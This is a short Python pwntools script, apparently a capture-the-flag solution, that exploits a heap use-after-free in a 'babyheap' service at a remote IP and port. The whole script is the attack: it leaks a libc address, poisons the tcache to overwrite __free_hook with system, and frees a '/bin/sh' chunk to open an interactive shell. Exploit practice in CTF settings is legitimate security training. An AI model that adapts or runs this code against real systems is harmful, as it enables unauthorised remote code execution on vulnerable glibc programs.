from pwn import *

# p = process('./babyheap')
p = remote('34.125.0.41', 8888)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create(idx, size, data):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b'\n', str(idx).encode('utf-8'))
	p.sendlineafter(b'\n', str(size).encode('utf-8'))
	p.sendlineafter(b'\n', bytes(data))

def edit(idx, data):
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'\n', str(idx).encode('utf-8'))
	p.sendlineafter(b'\n', bytes(data))

def delete(idx):
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b'\n', str(idx).encode('utf-8'))

def show(idx):
	p.sendlineafter(b'> ', b'4')
	p.sendlineafter(b'\n', str(idx).encode('utf-8'))


for i in range(9):
	create(i, 0x98, b'a'*8)

for i in range(8):
	delete(i)

show(7)
p.recvline()
p.recv(8)

libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x1ebbe0
print(hex(libc.address))

free_hook = libc.sym['__free_hook']
system = libc.sym['system']

edit(6, p64(free_hook))
create(0, 0x98, b'/bin/sh\x00')
create(1, 0x98, p64(system))
delete(0)

p.interactive()